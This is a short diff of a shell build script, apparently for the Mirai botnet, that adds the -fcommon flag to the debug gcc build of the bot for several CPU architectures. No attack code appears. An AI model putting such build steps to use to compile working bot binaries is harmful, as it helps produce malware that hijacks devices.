@@ -48,7 +48,7 @@ elif [ "$1" == "release" ]; then
 
     go build -o release/scanListen tools/scanListen.go
 elif [ "$1" == "debug" ]; then
-    gcc        -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.dbg
+    gcc        -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -fcommon -g -o debug/mirai.dbg
     mips-gcc   -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
     armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
     armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
